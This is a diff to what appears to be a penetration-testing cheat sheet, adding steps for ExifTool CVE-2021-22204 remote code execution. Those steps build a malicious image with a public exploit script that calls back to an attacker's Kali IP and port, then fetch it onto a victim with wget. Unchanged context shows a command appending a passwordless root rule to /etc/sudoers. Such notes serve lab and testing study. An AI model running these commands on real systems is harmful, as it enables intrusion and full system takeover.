@@ -193,6 +193,12 @@
 
    ```
 
+### Exiftool RCE 
+- If version < 12.23, and cronjob running sudo of exiftool
+- https://github.com/convisolabs/CVE-2021-22204-exiftool
+1. build image in kali ``` python3 50911.py -s {kali ip} {kali port} ```
+2. move the image.jpg to victim directory e.g. ``` wget http://xxx/image ```
+
 ### Write to system files for misconfigure Bins
 - Example: dosbox w/ SUID
 1. /etc/sudoers: ``` echo {current_user_id} ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers ```
